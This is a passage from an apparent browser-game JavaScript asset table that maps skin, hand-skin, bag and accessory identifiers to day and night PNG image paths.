      SKIN116N: "img/night-skin116.png",
      SKIN117D: "img/day-skin117.png",
      SKIN117N: "img/night-skin117.png",
      SKIN118D: "img/day-skin118.png",
      SKIN118N: "img/night-skin118.png",
      SKIN119D: "img/day-skin119.png",
      SKIN119N: "img/night-skin119.png",
      SKIN120D: "img/day-skin120.png",
      SKIN120N: "img/night-skin120.png",
      SKIN121D: "img/day-skin121.png",
      SKIN121N: "img/night-skin121.png",
      SKIN122D: "img/day-skin122.png",
      SKIN122N: "img/night-skin122.png",
      SKIN123D: "img/day-skin123.png",
      SKIN123N: "img/night-skin123.png",
      SKIN124D: "img/day-skin124.png",
      SKIN124N: "img/night-skin124.png",
      SKIN125D: "img/day-skin125.png",
      SKIN125N: "img/night-skin125.png",
      SKIN126D: "img/day-skin126.png",
      SKIN126N: "img/night-skin126.png",
      SKIN127D: "img/day-skin127.png",
      SKIN127N: "img/night-skin127.png",
      SKIN128D: "img/day-skin128.png",
      SKIN128N: "img/night-skin128.png",
      SKIN129D: "img/day-skin129.png",
      SKIN129N: "img/night-skin129.png",
      SKIN130D: "img/day-skin130-1.png",
      SKIN130N: "img/night-skin130-1.png",
      SKIN131D: "img/day-skin131.png",
      SKIN131N: "img/night-skin131.png",
      SKIN132D: "img/day-skin132.png",
      SKIN132N: "img/night-skin132.png",
      SKIN133D: "img/day-skin133.png",
      SKIN133N: "img/night-skin133.png",
      SKIN134D: "img/day-skin134.png",
      SKIN134N: "img/night-skin134.png",
      SKIN135D: "img/day-skin135.png",
      SKIN135N: "img/night-skin135.png",
      SKIN136D: "img/day-skin136.png",
      SKIN136N: "img/night-skin136.png",
      SKIN137D: "img/day-skin137.png",
      SKIN137N: "img/night-skin137.png",
      SKIN138D: "img/day-skin138.png",
      SKIN138N: "img/night-skin138.png",
      SKIN139D: "img/day-skin139.png",
      SKIN139N: "img/night-skin139.png",
      SKIN140D: "img/day-skin140.png",
      SKIN140N: "img/night-skin140.png",
      SKIN141D: "img/day-skin141.png",
      SKIN141N: "img/night-skin141.png",
      SKIN142D: "img/day-skin142.png",
      SKIN142N: "img/night-skin142.png",
      SKIN143D: "img/day-skin143.png",
      SKIN143N: "img/night-skin143.png",
      SKIN144D: "img/day-skin144.png",
      SKIN144N: "img/night-skin144.png",
      SKIN145D: "img/day-skin145.png",
      SKIN145N: "img/night-skin145.png",
      SKIN146D: "img/day-skin146.png",
      SKIN146N: "img/night-skin146.png",
      SKIN147D: "img/day-skin147.png",
      SKIN147N: "img/night-skin147.png",
      SKIN148D: "img/day-skin148.png",
      SKIN148N: "img/night-skin148.png",
      SKIN149D: "img/day-skin149.png",
      SKIN149N: "img/night-skin149.png",
      SKIN150D: "img/day-skin150.png",
      SKIN150N: "img/night-skin150.png",
      HAND_SKIN0D: "img/day-hand-skin0.png",
      HAND_SKIN0N: "img/night-hand-skin0.png",
      HAND_SKIN1D: "img/day-hand-skin1.png",
      HAND_SKIN1N: "img/night-hand-skin1.png",
      HAND_SKIN2D: "img/day-hand-skin2.png",
      HAND_SKIN2N: "img/night-hand-skin2.png",
      HAND_SKIN3D: "img/day-hand-skin3.png",
      HAND_SKIN3N: "img/night-hand-skin3.png",
      HAND_SKIN4D: "img/day-hand-skin4.png",
      HAND_SKIN4N: "img/night-hand-skin4.png",
      HAND_SKIN5D: "img/day-hand-skin5.png",
      HAND_SKIN5N: "img/night-hand-skin5.png",
      HAND_SKIN6D: "img/day-hand-skin6.png",
      HAND_SKIN6N: "img/night-hand-skin6.png",
      HAND_SKIN7D: "img/day-hand-skin6.png",
      HAND_SKIN7N: "img/night-hand-skin6.png",
      HAND_SKIN8D: "img/day-hand-skin8.png",
      HAND_SKIN8N: "img/night-hand-skin8.png",
      HAND_SKIN9D: "img/day-hand-skin9.png",
      HAND_SKIN9N: "img/night-hand-skin9.png",
      HAND_SKIN10D: "img/day-hand-skin10.png",
      HAND_SKIN10N: "img/night-hand-skin10.png",
      HAND_SKIN11D: "img/day-hand-skin11.png",
      HAND_SKIN11N: "img/night-hand-skin11.png",
      HAND_SKIN12D: "img/day-hand-skin12.png",
      HAND_SKIN12N: "img/night-hand-skin12.png",
      HAND_SKIN13D: "img/day-hand-skin13.png",
      HAND_SKIN13N: "img/night-hand-skin13.png",
      HAND_SKIN14D: "img/day-hand-skin14.png",
      HAND_SKIN14N: "img/night-hand-skin14.png",
      HAND_SKIN15D: "img/day-hand-skin15.png",
      HAND_SKIN15N: "img/night-hand-skin15.png",
      HAND_SKIN16D: "img/day-hand-skin16.png",
      HAND_SKIN16N: "img/night-hand-skin16.png",
      HAND_SKIN17D: "img/day-hand-skin17.png",
      HAND_SKIN17N: "img/night-hand-skin17.png",
      HAND_SKIN18D: "img/day-hand-skin18.png",
      HAND_SKIN18N: "img/night-hand-skin18.png",
      HAND_SKIN19D: "img/day-hand-skin19.png",
      HAND_SKIN19N: "img/night-hand-skin19.png",
      HAND_SKIN20D: "img/day-hand-skin20.png",
      HAND_SKIN20N: "img/night-hand-skin20.png",
      HAND_SKIN21D: "img/day-hand-skin21.png",
      HAND_SKIN21N: "img/night-hand-skin21.png",
      HAND_SKIN22D: "img/day-hand-skin22.png",
      HAND_SKIN22N: "img/night-hand-skin22.png",
      HAND_SKIN23D: "img/day-hand-skin23.png",
      HAND_SKIN23N: "img/night-hand-skin23.png",
      HAND_SKIN24D: "img/day-hand-skin24.png",
      HAND_SKIN24N: "img/night-hand-skin24.png",
      HAND_SKIN25D: "img/day-hand-skin25.png",
      HAND_SKIN25N: "img/night-hand-skin25.png",
      HAND_SKIN26D: "img/day-hand-skin26.png",
      HAND_SKIN26N: "img/night-hand-skin26.png",
      HAND_SKIN27D: "img/day-hand-skin27.png",
      HAND_SKIN27N: "img/night-hand-skin27.png",
      HAND_SKIN28D: "img/day-hand-skin28.png",
      HAND_SKIN28N: "img/night-hand-skin28.png",
      HAND_SKIN29D: "img/day-hand-skin29.png",
      HAND_SKIN29N: "img/night-hand-skin29.png",
      HAND_SKIN30D: "img/day-hand-skin30.png",
      HAND_SKIN30N: "img/night-hand-skin30.png",
      HAND_SKIN31D: "img/day-hand-skin31.png",
      HAND_SKIN31N: "img/night-hand-skin31.png",
      HAND_SKIN32D: "img/day-hand-skin32.png",
      HAND_SKIN32N: "img/night-hand-skin32.png",
      HAND_SKIN33D: "img/day-hand-skin33.png",
      HAND_SKIN33N: "img/night-hand-skin33.png",
      HAND_SKIN34D: "img/day-hand-skin34.png",
      HAND_SKIN34N: "img/night-hand-skin34.png",
      HAND_SKIN35D: "img/day-hand-skin35.png",
      HAND_SKIN35N: "img/night-hand-skin35.png",
      HAND_SKIN36D: "img/day-hand-skin36.png",
      HAND_SKIN36N: "img/night-hand-skin36.png",
      HAND_SKIN37D: "img/day-hand-skin37.png",
      HAND_SKIN37N: "img/night-hand-skin37.png",
      HAND_SKIN38D: "img/day-hand-skin38.png",
      HAND_SKIN38N: "img/night-hand-skin38.png",
      HAND_SKIN39D: "img/day-hand-skin39.png",
      HAND_SKIN39N: "img/night-hand-skin39.png",
      HAND_SKIN40D: "img/day-hand-skin40.png",
      HAND_SKIN40N: "img/night-hand-skin40.png",
      HAND_SKIN41D: "img/day-hand-skin41.png",
      HAND_SKIN41N: "img/night-hand-skin41.png",
      HAND_SKIN42D: "img/day-hand-skin42.png",
      HAND_SKIN42N: "img/night-hand-skin42.png",
      HAND_SKIN43D: "img/day-hand-skin43.png",
      HAND_SKIN43N: "img/night-hand-skin43.png",
      HAND_SKIN44D: "img/day-hand-skin16.png",
      HAND_SKIN44N: "img/night-hand-skin16.png",
      HAND_SKIN45D: "img/day-hand-skin45.png",
      HAND_SKIN45N: "img/night-hand-skin45.png",
      HAND_SKIN46D: "img/day-hand-skin46.png",
      HAND_SKIN46N: "img/night-hand-skin46.png",
      HAND_SKIN47D: "img/day-hand-skin47.png",
      HAND_SKIN47N: "img/night-hand-skin47.png",
      HAND_SKIN48D: "img/day-hand-skin48.png",
      HAND_SKIN48N: "img/night-hand-skin48.png",
      HAND_SKIN49D: "img/day-hand-skin49.png",
      HAND_SKIN49N: "img/night-hand-skin49.png",
      HAND_SKIN50D: "img/day-hand-skin49.png",
      HAND_SKIN50N: "img/night-hand-skin49.png",
      HAND_SKIN51D: "img/day-hand-skin51.png",
      HAND_SKIN51N: "img/night-hand-skin51.png",
      HAND_SKIN52D: "img/day-hand-skin52.png",
      HAND_SKIN52N: "img/night-hand-skin52.png",
      HAND_SKIN53D: "img/day-hand-skin53.png",
      HAND_SKIN53N: "img/night-hand-skin53.png",
      HAND_SKIN54D: "img/day-hand-skin53.png",
      HAND_SKIN54N: "img/night-hand-skin53.png",
      HAND_SKIN55D: "img/day-hand-skin55.png",
      HAND_SKIN55N: "img/night-hand-skin55.png",
      HAND_SKIN56D: "img/day-hand-skin56.png",
      HAND_SKIN56N: "img/night-hand-skin56.png",
      HAND_SKIN57D: "img/day-hand-skin57.png",
      HAND_SKIN57N: "img/night-hand-skin57.png",
      HAND_SKIN58D: "img/day-hand-skin58.png",
      HAND_SKIN58N: "img/night-hand-skin58.png",
      HAND_SKIN59D: "img/day-hand-skin59.png",
      HAND_SKIN59N: "img/night-hand-skin59.png",
      HAND_SKIN60D: "img/day-hand-skin61.png",
      HAND_SKIN60N: "img/night-hand-skin61.png",
      HAND_SKIN61D: "img/day-hand-skin61.png",
      HAND_SKIN61N: "img/night-hand-skin61.png",
      HAND_SKIN62D: "img/day-hand-skin62.png",
      HAND_SKIN62N: "img/night-hand-skin62.png",
      HAND_SKIN63D: "img/day-hand-skin63.png",
      HAND_SKIN63N: "img/night-hand-skin63.png",
      HAND_SKIN64D: "img/day-hand-skin64.png",
      HAND_SKIN64N: "img/night-hand-skin64.png",
      HAND_SKIN65D: "img/day-hand-skin65.png",
      HAND_SKIN65N: "img/night-hand-skin65.png",
      HAND_SKIN66D: "img/day-hand-skin66.png",
      HAND_SKIN66N: "img/night-hand-skin66.png",
      HAND_SKIN67D: "img/day-hand-skin67.png",
      HAND_SKIN67N: "img/night-hand-skin67.png",
      HAND_SKIN68D: "img/day-hand-skin68.png",
      HAND_SKIN68N: "img/night-hand-skin68.png",
      HAND_SKIN69D: "img/day-hand-skin69.png",
      HAND_SKIN69N: "img/night-hand-skin69.png",
      HAND_SKIN70D: "img/day-hand-skin70.png",
      HAND_SKIN70N: "img/night-hand-skin70.png",
      HAND_SKIN71D: "img/day-hand-skin71.png",
      HAND_SKIN71N: "img/night-hand-skin71.png",
      HAND_SKIN72D: "img/day-hand-skin72.png",
      HAND_SKIN72N: "img/night-hand-skin72.png",
      HAND_SKIN73D: "img/day-hand-skin73.png",
      HAND_SKIN73N: "img/night-hand-skin73.png",
      HAND_SKIN74D: "img/day-hand-skin74.png",
      HAND_SKIN74N: "img/night-hand-skin74.png",
      HAND_SKIN75D: "img/day-hand-skin75.png",
      HAND_SKIN75N: "img/night-hand-skin75.png",
      HAND_SKIN76D: "img/day-hand-skin76.png",
      HAND_SKIN76N: "img/night-hand-skin76.png",
      HAND_SKIN77D: "img/day-hand-skin77.png",
      HAND_SKIN77N: "img/night-hand-skin77.png",
      HAND_SKIN78D: "img/day-hand-skin78.png",
      HAND_SKIN78N: "img/night-hand-skin78.png",
      HAND_SKIN79D: "img/day-hand-skin79.png",
      HAND_SKIN79N: "img/night-hand-skin79.png",
      HAND_SKIN80D: "img/day-hand-skin80.png",
      HAND_SKIN80N: "img/night-hand-skin80.png",
      HAND_SKIN81D: "img/day-hand-skin81.png",
      HAND_SKIN81N: "img/night-hand-skin81.png",
      HAND_SKIN82D: "img/day-hand-skin82.png",
      HAND_SKIN82N: "img/night-hand-skin82.png",
      HAND_SKIN83D: "img/day-hand-skin83.png",
      HAND_SKIN83N: "img/night-hand-skin83.png",
      HAND_SKIN84D: "img/day-hand-skin84.png",
      HAND_SKIN84N: "img/night-hand-skin84.png",
      HAND_SKIN85D: "img/day-hand-skin85.png",
      HAND_SKIN85N: "img/night-hand-skin85.png",
      HAND_SKIN86D: "img/day-hand-skin86.png",
      HAND_SKIN86N: "img/night-hand-skin86.png",
      HAND_SKIN87D: "img/day-hand-skin87.png",
      HAND_SKIN87N: "img/night-hand-skin87.png",
      HAND_SKIN88D: "img/day-hand-skin88.png",
      HAND_SKIN88N: "img/night-hand-skin88.png",
      HAND_SKIN89D: "img/day-hand-skin89.png",
      HAND_SKIN89N: "img/night-hand-skin89.png",
      HAND_SKIN90D: "img/day-hand-skin90.png",
      HAND_SKIN90N: "img/night-hand-skin90.png",
      HAND_SKIN91D: "img/day-hand-skin91.png",
      HAND_SKIN91N: "img/night-hand-skin91.png",
      HAND_SKIN92D: "img/day-hand-skin92.png",
      HAND_SKIN92N: "img/night-hand-skin92.png",
      HAND_SKIN93D: "img/day-hand-skin93.png",
      HAND_SKIN93N: "img/night-hand-skin93.png",
      HAND_SKIN94D: "img/day-hand-skin94.png",
      HAND_SKIN94N: "img/night-hand-skin94.png",
      HAND_SKIN95D: "img/day-hand-skin95.png",
      HAND_SKIN95N: "img/night-hand-skin95.png",
      HAND_SKIN96D: "img/day-hand-skin96.png",
      HAND_SKIN96N: "img/night-hand-skin96.png",
      HAND_SKIN97D: "img/day-hand-skin97.png",
      HAND_SKIN97N: "img/night-hand-skin97.png",
      HAND_SKIN98D: "img/day-hand-skin98.png",
      HAND_SKIN98N: "img/night-hand-skin98.png",
      HAND_SKIN99D: "img/day-hand-skin99.png",
      HAND_SKIN99N: "img/night-hand-skin99.png",
      HAND_SKIN100D: "img/day-hand-skin100.png",
      HAND_SKIN100N: "img/night-hand-skin100.png",
      HAND_SKIN101D: "img/day-hand-skin101.png",
      HAND_SKIN101N: "img/night-hand-skin101.png",
      HAND_SKIN102D: "img/day-hand-skin102.png",
      HAND_SKIN102N: "img/night-hand-skin102.png",
      HAND_SKIN103D: "img/day-hand-skin103.png",
      HAND_SKIN103N: "img/night-hand-skin103.png",
      HAND_SKIN104D: "img/day-hand-skin104.png",
      HAND_SKIN104N: "img/night-hand-skin104.png",
      HAND_SKIN105D: "img/day-hand-skin105.png",
      HAND_SKIN105N: "img/night-hand-skin105.png",
      HAND_SKIN106D: "img/day-hand-skin106.png",
      HAND_SKIN106N: "img/night-hand-skin106.png",
      HAND_SKIN107D: "img/day-hand-skin107.png",
      HAND_SKIN107N: "img/night-hand-skin107.png",
      HAND_SKIN108D: "img/day-hand-skin108.png",
      HAND_SKIN108N: "img/night-hand-skin108.png",
      HAND_SKIN109D: "img/day-hand-skin109.png",
      HAND_SKIN109N: "img/night-hand-skin109.png",
      HAND_SKIN110D: "img/day-hand-skin110.png",
      HAND_SKIN110N: "img/night-hand-skin110.png",
      HAND_SKIN111D: "img/day-hand-skin111.png",
      HAND_SKIN111N: "img/night-hand-skin111.png",
      HAND_SKIN112D: "img/day-hand-skin112.png",
      HAND_SKIN112N: "img/night-hand-skin112.png",
      HAND_SKIN113D: "img/day-hand-skin113.png",
      HAND_SKIN113N: "img/night-hand-skin113.png",
      HAND_SKIN114D: "img/day-hand-skin114.png",
      HAND_SKIN114N: "img/night-hand-skin114.png",
      HAND_SKIN115D: "img/day-hand-skin115.png",
      HAND_SKIN115N: "img/night-hand-skin115.png",
      HAND_SKIN116D: "img/day-hand-skin116.png",
      HAND_SKIN116N: "img/night-hand-skin116.png",
      HAND_SKIN117D: "img/day-hand-skin117.png",
      HAND_SKIN117N: "img/night-hand-skin117.png",
      HAND_SKIN118D: "img/day-hand-skin118.png",
      HAND_SKIN118N: "img/night-hand-skin118.png",
      HAND_SKIN119D: "img/day-hand-skin119.png",
      HAND_SKIN119N: "img/night-hand-skin119.png",
      HAND_SKIN120D: "img/day-hand-skin120.png",
      HAND_SKIN120N: "img/night-hand-skin120.png",
      HAND_SKIN121D: "img/day-hand-skin122.png",
      HAND_SKIN121N: "img/night-hand-skin122.png",
      HAND_SKIN122D: "img/day-hand-skin122.png",
      HAND_SKIN122N: "img/night-hand-skin122.png",
      HAND_SKIN123D: "img/day-hand-skin122.png",
      HAND_SKIN123N: "img/night-hand-skin122.png",
      HAND_SKIN124D: "img/day-hand-skin124.png",
      HAND_SKIN124N: "img/night-hand-skin124.png",
      HAND_SKIN125D: "img/day-hand-skin125.png",
      HAND_SKIN125N: "img/night-hand-skin125.png",
      HAND_SKIN126D: "img/day-hand-skin126.png",
      HAND_SKIN126N: "img/night-hand-skin126.png",
      HAND_SKIN127D: "img/day-hand-skin127.png",
      HAND_SKIN127N: "img/night-hand-skin127.png",
      HAND_SKIN128D: "img/day-hand-skin128.png",
      HAND_SKIN128N: "img/night-hand-skin128.png",
      HAND_SKIN129D: "img/day-hand-skin129.png",
      HAND_SKIN129N: "img/night-hand-skin129.png",
      HAND_SKIN130D: "img/day-hand-skin130.png",
      HAND_SKIN130N: "img/night-hand-skin130.png",
      HAND_SKIN131D: "img/day-hand-skin131.png",
      HAND_SKIN131N: "img/night-hand-skin131.png",
      HAND_SKIN132D: "img/day-hand-skin130.png",
      HAND_SKIN132N: "img/night-hand-skin130.png",
      HAND_SKIN133D: "img/day-hand-skin133.png",
      HAND_SKIN133N: "img/night-hand-skin133.png",
      HAND_SKIN134D: "img/day-hand-skin134.png",
      HAND_SKIN134N: "img/night-hand-skin134.png",
      HAND_SKIN135D: "img/day-hand-skin135.png",
      HAND_SKIN135N: "img/night-hand-skin135.png",
      HAND_SKIN136D: "img/day-hand-skin136.png",
      HAND_SKIN136N: "img/night-hand-skin136.png",
      HAND_SKIN137D: "img/day-hand-skin137.png",
      HAND_SKIN137N: "img/night-hand-skin137.png",
      HAND_SKIN138D: "img/day-hand-skin138.png",
      HAND_SKIN138N: "img/night-hand-skin138.png",
      HAND_SKIN139D: "img/day-hand-skin139.png",
      HAND_SKIN139N: "img/night-hand-skin139.png",
      HAND_SKIN140D: "img/day-hand-skin140.png",
      HAND_SKIN140N: "img/night-hand-skin140.png",
      HAND_SKIN141D: "img/day-hand-skin141.png",
      HAND_SKIN141N: "img/night-hand-skin141.png",
      HAND_SKIN142D: "img/day-hand-skin142.png",
      HAND_SKIN142N: "img/night-hand-skin142.png",
      HAND_SKIN143D: "img/day-hand-skin143.png",
      HAND_SKIN143N: "img/night-hand-skin143.png",
      HAND_SKIN144D: "img/day-hand-skin144.png",
      HAND_SKIN144N: "img/night-hand-skin144.png",
      HAND_SKIN145D: "img/day-hand-skin145.png",
      HAND_SKIN145N: "img/night-hand-skin145.png",
      HAND_SKIN146D: "img/day-hand-skin146.png",
      HAND_SKIN146N: "img/night-hand-skin146.png",
      HAND_SKIN147D: "img/day-hand-skin147.png",
      HAND_SKIN147N: "img/night-hand-skin147.png",
      HAND_SKIN148D: "img/day-hand-skin148.png",
      HAND_SKIN148N: "img/night-hand-skin148.png",
      HAND_SKIN149D: "img/day-hand-skin149.png",
      HAND_SKIN149N: "img/night-hand-skin149.png",
      HAND_SKIN150D: "img/day-hand-skin150.png",
      HAND_SKIN150N: "img/night-hand-skin150.png",
      BAG_STARD: "img/day-bag-star0.png",
      BAG_STARN: "img/night-bag-star0.png",
      BAG0D: "img/day-bag0.png",
      BAG0N: "img/night-bag0.png",
      BAG1D: "img/day-bag1.png",
      BAG1N: "img/night-bag1.png",
      BAG2D: "img/day-bag2.png",
      BAG2N: "img/night-bag2.png",
      BAG3D: "img/day-bag3.png",
      BAG3N: "img/night-bag3.png",
      BAG4D: "img/day-bag4.png",
      BAG4N: "img/night-bag4.png",
      BAG5D: "img/day-bag5.png",
      BAG5N: "img/night-bag5.png",
      BAG6D: "img/day-bag6.png",
      BAG6N: "img/night-bag6.png",
      BAG7D: "img/day-bag7.png",
      BAG7N: "img/night-bag7.png",
      BAG8D: "img/day-bag8.png",
      BAG8N: "img/night-bag8.png",
      BAG9D: "img/day-bag9.png",
      BAG9N: "img/night-bag9.png",
      BAG10D: "img/day-bag10.png",
      BAG10N: "img/night-bag10.png",
      BAG11D: "img/day-bag11.png",
      BAG11N: "img/night-bag11.png",
      BAG13D: "img/day-bag13.png",
      BAG13N: "img/night-bag13.png",
      BAG14D: "img/day-bag14.png",
      BAG14N: "img/night-bag14.png",
      BAG16D: "img/day-bag16.png",
      BAG16N: "img/night-bag16.png",
      BAG17D: "img/day-bag17.png",
      BAG17N: "img/night-bag17.png",
      BAG18D: "img/day-bag18.png",
      BAG18N: "img/night-bag18.png",
      BAG19D: "img/day-bag19.png",
      BAG19N: "img/night-bag19.png",
      BAG20D: "img/day-bag20.png",
      BAG20N: "img/night-bag20.png",
      BAG21D: "img/day-bag21.png",
      BAG21N: "img/night-bag21.png",
      BAG22D: "img/day-bag22.png",
      BAG22N: "img/night-bag22.png",
      BAG23D: "img/day-bag23.png",
      BAG23N: "img/night-bag23.png",
      BAG24D: "img/day-bag24.png",
      BAG24N: "img/night-bag24.png",
      BAG25D: "img/day-bag25.png",
      BAG25N: "img/night-bag25.png",
      BAG26D: "img/day-bag26.png",
      BAG26N: "img/night-bag26.png",
      BAG27D: "img/day-bag27.png",
      BAG27N: "img/night-bag27.png",
      BAG28D: "img/day-bag28.png",
      BAG28N: "img/night-bag28.png",
      BAG29D: "img/day-bag29.png",
      BAG29N: "img/night-bag29.png",
      BAG30D: "img/day-bag30.png",
      BAG30N: "img/night-bag30.png",
      BAG31D: "img/day-bag31.png",
      BAG31N: "img/night-bag31.png",
      BAG32D: "img/day-bag32.png",
      BAG32N: "img/night-bag32.png",
      BAG33D: "img/day-bag33.png",
      BAG33N: "img/night-bag33.png",
      BAG34D: "img/day-bag34.png",
      BAG34N: "img/night-bag34.png",
      BAG35D: "img/day-bag35.png",
      BAG35N: "img/night-bag35.png",
      BAG36D: "img/day-bag36.png",
      BAG36N: "img/night-bag36.png",
      BAG37D: "img/day-bag37.png",
      BAG37N: "img/night-bag37.png",
      BAG38D: "img/day-bag38.png",
      BAG38N: "img/night-bag38.png",
      BAG39D: "img/day-bag39.png",
      BAG39N: "img/night-bag39.png",
      BAG40D: "img/day-bag40.png",
      BAG40N: "img/night-bag40.png",
      BAG41D: "img/day-bag41.png",
      BAG41N: "img/night-bag41.png",
      BAG42D: "img/day-bag42.png",
      BAG42N: "img/night-bag42.png",
      BAG43D: "img/day-bag43.png",
      BAG43N: "img/night-bag43.png",
      BAG44D: "img/day-bag44.png",
      BAG44N: "img/night-bag44.png",
      BAG45D: "img/day-bag45.png",
      BAG45N: "img/night-bag45.png",
      BAG46D: "img/day-bag46.png",
      BAG46N: "img/night-bag46.png",
      BAG47D: "img/day-bag47.png",
      BAG47N: "img/night-bag47.png",
      BAG48D: "img/day-bag48.png",
      BAG48N: "img/night-bag48.png",
      BAG49D: "img/day-bag49.png",
      BAG49N: "img/night-bag49.png",
      BAG50D: "img/day-bag50.png",
      BAG50N: "img/night-bag50.png",
      BAG51D: "img/day-bag51.png",
      BAG51N: "img/night-bag51.png",
      BAG52D: "img/day-bag52.png",
      BAG52N: "img/night-bag52.png",
      BAG53D: "img/day-bag53.png",
      BAG53N: "img/night-bag53.png",
      BAG54D: "img/day-bag54.png",
      BAG54N: "img/night-bag54.png",
      BAG55D: "img/day-bag55.png",
      BAG55N: "img/night-bag55.png",
      BAG56D: "img/day-bag56.png",
      BAG56N: "img/night-bag56.png",
      BAG57D: "img/day-bag57.png",
      BAG57N: "img/night-bag57.png",
      BAG58D: "img/day-bag58.png",
      BAG58N: "img/night-bag58.png",
      BAG59D: "img/day-bag59.png",
      BAG59N: "img/night-bag59.png",
      BAG60D: "img/day-bag60.png",
      BAG60N: "img/night-bag60.png",
      BAG61D: "img/day-bag61.png",
      BAG61N: "img/night-bag61.png",
      BAG62D: "img/day-bag62.png",
      BAG62N: "img/night-bag62.png",
      BAG63D: "img/day-bag63.png",
      BAG63N: "img/night-bag63.png",
      BAG64D: "img/day-bag64.png",
      BAG64N: "img/night-bag64.png",
      BAG65D: "img/day-bag65.png",
      BAG65N: "img/night-bag65.png",
      BAG66D: "img/day-bag66.png",
      BAG66N: "img/night-bag66.png",
      BAG67D: "img/day-bag67.png",
      BAG67N: "img/night-bag67.png",
      BAG68D: "img/day-bag68.png",
      BAG68N: "img/night-bag68.png",
      ACCESSORY0D: "img/day-accessory0.png",
      ACCESSORY17D: "img/day-accessory0-pacques.png",
      ACCESSORY17N: "img/night-accessory0-pacques.png",
      ACCESSORY13D: "img/day-accessory13.png",
      ACCESSORY13N: "img/night-accessory13.png",
      ACCESSORY14D: "img/day-accessory14.png",
      ACCESSORY14N: "img/night-accessory14.png",
      ACCESSORY15D: "img/day-accessory15.png",
      ACCESSORY15N: "img/night-accessory15.png",
      ACCESSORY16D: "img/day-accessory16.png",
      ACCESSORY16N: "img/night-accessory16.png",
      ACCESSORY18D: "img/day-accessory17.png",
      ACCESSORY18N: "img/day-accessory17.png",
      ACCESSORY19D: "img/day-accessory19.png",
      ACCESSORY19N: "img/night-accessory19.png",
      ACCESSORY20D: "img/day-accessory20.png",
      ACCESSORY20N: "img/night-accessory20.png",
      ACCESSORY21D: "img/day-accessory21.png",
      ACCESSORY21N: "img/night-accessory21.png",
      ACCESSORY22D: "img/day-accessory22.png",
      ACCESSORY22N: "img/night-accessory22.png",
      ACCESSORY23D: "img/day-accessory23.png",
      ACCESSORY23N: "img/night-accessory23.png",
      ACCESSORY24D: "img/day-accessory24.png",
      ACCESSORY24N: "img/night-accessory24.png",
      ACCESSORY25D: "img/day-accessory25.png",
      ACCESSORY25N: "img/night-accessory25.png",
      ACCESSORY26D: "img/day-accessory26.png",
      ACCESSORY26N: "img/night-accessory26.png",
      ACCESSORY27D: "img/day-accessory27.png",
      ACCESSORY27N: "img/night-accessory27.png",
      ACCESSORY28D: "img/day-accessory18.png",
      ACCESSORY28N: "img/night-accessory18.png",
      ACCESSORY29D: "img/day-accessory29.png",
      ACCESSORY29N: "img/night-accessory29.png",
      ACCESSORY30D: "img/day-accessory30.png",
      ACCESSORY30N: "img/night-accessory30.png",
      ACCESSORY31D: "img/day-accessory31.png",
      ACCESSORY31N: "img/night-accessory31.png",
      ACCESSORY32D: "img/day-accessory32.png",
      ACCESSORY32N: "img/night-accessory32.png",
      ACCESSORY33D: "img/day-accessory33.png",
      ACCESSORY33N: "img/night-accessory33.png",
      ACCESSORY34D: "img/day-accessory34.png",
      ACCESSORY34N: "img/night-accessory34.png",
      ACCESSORY35D: "img/day-accessory35.png",
      ACCESSORY35N: "img/night-accessory35.png",
      ACCESSORY36D: "img/day-accessory28.png",
      ACCESSORY36N: "img/night-accessory28.png",
      ACCESSORY37D: "img/day-accessory36.png",
      ACCESSORY37N: "img/night-accessory36.png",
      ACCESSORY38D: "img/day-accessory37.png",
      ACCESSORY38N: "img/night-accessory37.png",
      ACCESSORY39D: "img/day-accessory39.png",
      ACCESSORY39N: "img/night-accessory39.png",
      ACCESSORY40D: "img/day-accessory40.png",
      ACCESSORY40N: "img/night-accessory40.png",
      ACCESSORY41D: "img/day-accessory41.png",
      ACCESSORY41N: "img/night-accessory41.png",
      ACCESSORY42D: "img/day-accessory42.png",
      ACCESSORY42N: "img/night-accessory42.png",
      ACCESSORY43D: "img/day-accessory43.png",
      ACCESSORY43N: "img/night-accessory43.png",
      ACCESSORY44D: "img/day-accessory44.png",
      ACCESSORY44N: "img/night-accessory44.png",
      ACCESSORY45D: "img/day-accessory38.png",
      ACCESSORY45N: "img/night-accessory38.png",
      ACCESSORY46D: "img/day-accessory46.png",
      ACCESSORY46N: "img/night-accessory46.png",
      ACCESSORY47D: "img/day-accessory47.png",
      ACCESSORY47N: "img/night-accessory47.png",
      ACCESSORY48D: "img/day-accessory48.png",
      ACCESSORY48N: "img/night-accessory48.png",
      ACCESSORY49D: "img/day-accessory49.png",
      ACCESSORY49N: "img/night-accessory49.png",
      ACCESSORY50D: "img/day-accessory45.png",
      ACCESSORY50N: "img/night-accessory45.png",
      ACCESSORY51D: "img/day-accessory50.png",
      ACCESSORY51N: "img/night-accessory50.png",
      ACCESSORY52D: "img/day-accessory51.png",
      ACCESSORY52N: "img/night-accessory51.png",
      ACCESSORY53D: "img/day-accessory52.png",
      ACCESSORY53N: "img/night-accessory52.png",
      ACCESSORY54D: "img/day-accessory53.png",
      ACCESSORY54N: "img/night-accessory53.png",
      ACCESSORY55D: "img/day-accessory54.png",
      ACCESSORY55N: "img/night-accessory54.png",
      ACCESSORY56D: "img/day-accessory55.png",
      ACCESSORY56N: "img/night-accessory55.png",
      ACCESSORY57D: "img/day-accessory56.png",
      ACCESSORY57N: "img/night-accessory56.png",
      ACCESSORY58D: "img/day-accessory57.png",
      ACCESSORY58N: "img/night-accessory57.png",
      ACCESSORY59D: "img/day-accessory58.png",
      ACCESSORY59N: "img/night-accessory58.png",
      ACCESSORY60D: "img/day-accessory59.png",
      ACCESSORY60N: "img/night-accessory59.png",
      ACCESSORY61D: "img/day-accessory60.png",
      ACCESSORY61N: "img/night-accessory60.png",
      ACCESSORY62D: "img/day-accessory61.png",
      ACCESSORY62N: "img/night-accessory61.png",
      ACCESSORY63D: "img/day-accessory62.png",
      ACCESSORY63N: "img/night-accessory62.png",
      ACCESSORY64D: "img/day-accessory63.png",
      ACCESSORY64N: "img/night-accessory63.png",
      ACCESSORY65D: "img/day-accessory64.png",
      ACCESSORY65N: "img/night-accessory64.png",
      ACCESSORY66D: "img/day-accessory65.png",
      ACCESSORY66N: "img/night-accessory65.png",
      ACCESSORY67D: "img/day-accessory66.png",
      ACCESSORY67N: "img/night-accessory66.png",
      ACCESSORY68D: "img/day-accessory67.png",
      ACCESSORY68N: "img/night-accessory67.png",
      ACCESSORY69D: "img/day-accessory68.png",
      ACCESSORY69N: "img/night-accessory68.png",
      ACCESSORY70D: "img/day-accessory69.png",
      ACCESSORY70N: "img/night-accessory69.png",
      ACCESSORY71D: "img/day-accessory70.png",
      ACCESSORY71N: "img/night-accessory70.png",
